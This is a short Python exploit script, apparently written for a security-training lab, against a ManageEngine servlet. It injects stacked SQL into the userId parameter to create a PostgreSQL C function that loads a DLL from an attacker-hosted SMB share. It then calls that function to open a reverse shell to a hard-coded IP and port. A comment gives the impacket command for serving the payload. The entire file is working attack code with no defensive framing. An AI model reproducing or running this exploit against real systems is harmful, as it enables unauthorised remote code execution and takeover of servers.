# This exploit requires the .dll to be hosted on an SMB share
# impacket-smbserver -smb2support pwn /path/to/dir will do the trick
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send(query):
    url = "https://manageengine:8443"
    path = f"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1{query}"
    endpoint = url + path
    req = requests.get(endpoint, verify=False).status_code

    if int(req) == 200:
        return True
    else:
        print("[-] Fatal error..")
        return False

def create_udf():
    print(f"[+] Creating UDF Function")
    make_udf_query = f";CREATE OR REPLACE FUNCTION demo(text,integer) returns void as $$\\\\192.168.45.232\\awae\\rce.dll$$, $$connect_back$$ LANGUAGE C strict;--"
    
    if send(make_udf_query):
        print("[+] UDF Function appears to have been created successfully!")
        return True
    else:
        return False

def trigger_udf(cb_ip, cb_port):
    trigger_udf_query = f";SELECT demo($${cb_ip}$$,{cb_port});--"
    print(f"[+] Executing function")
    send(trigger_udf_query)
    print("[!] Happy shell!")

def main():
    create_udf()
    trigger_udf('192.168.45.232', 31337)

main()
